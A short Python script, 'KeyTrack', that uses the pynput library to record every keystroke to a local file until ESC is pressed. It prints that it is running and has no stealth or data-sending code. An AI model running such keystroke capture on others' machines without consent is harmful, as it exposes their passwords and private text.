# KeyTrack - Basic Keylogger
# This program records keystrokes and saves them to a file.

from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        # Write the character of the key pressed
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (like shift, enter)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    # Stop listener when 'ESC' is pressed
    if key == keyboard.Key.esc:
        return False

# Main program
if __name__ == "__main__":
    print("KeyTrack is running... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print(f"Keystrokes saved to '{log_file}'")
